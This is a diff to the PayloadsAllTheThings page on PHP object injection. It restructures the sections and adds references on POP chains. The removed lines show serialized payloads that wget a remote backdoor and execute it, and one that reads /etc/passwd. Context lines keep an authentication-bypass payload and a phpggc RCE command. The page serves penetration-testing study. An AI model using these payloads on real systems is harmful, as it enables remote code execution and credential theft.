@@ -10,7 +10,16 @@ The following magic methods will help you for a PHP Object injection
 
 Also you should check the `Wrapper Phar://` in [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar) which use a PHP object injection.
 
-## __wakeup in the unserialize function
+## Summary
+
+* [General concept](#general-concept)
+* [Authentication bypass](#authentication-bypass)
+* [Finding and using gadgets](#finding-and-using-gadgets)
+* [Real world examples](#real-world-examples)
+* [References](#references)
+
+
+## General concept
 
 Vulnerable code:
 
@@ -38,7 +47,7 @@ Vulnerable code:
 ?>
 ```
 
-Payload:
+Craft a payload using existing code inside the application.
 
 ```php
 # Basic serialized data
@@ -102,35 +111,9 @@ Payload:
 O:6:"Object":2:{s:10:"secretCode";N;s:4:"guess";R:2;}
 ```
 
-## Others exploits
-
-Reverse Shell
-
-```php
-class PHPObjectInjection
-{
-    // CHANGE URL/FILENAME TO MATCH YOUR SETUP
-    public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";
-}
-
-echo urlencode(serialize(new PHPObjectInjection));
-```
-
-Basic detection
-
-```php
-class PHPObjectInjection
-{
-    // CHANGE URL/FILENAME TO MATCH YOUR SETUP
-    public $inject = "system('cat /etc/passwd');";
-}
-
-echo urlencode(serialize(new PHPObjectInjection));
-//O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A26%3A%22system%28%27cat+%2Fetc%2Fpasswd%27%29%3B%22%3B%7D
-//'O:18:"PHPObjectInjection":1:{s:6:"inject";s:26:"system(\'cat+/etc/passwd\');";}'
-```
-
 ## Finding and using gadgets
+
+Also called "PHP POP Chains", they can be used to gain RCE on the system.
 
 [PHPGGC](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:
 
@@ -165,3 +148,4 @@ phpggc monolog/rce1 'phpinfo();' -s
 * [CTF writeup: PHP object injection in kaspersky CTF](https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
 * [Jack The Ripper Web challeneg Write-up from ECSC 2019 Quals Team France by Rawsec](https://rawsec.ml/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
 * [Rusty Joomla RCE Unserialize overflow](https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41)
+* [PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
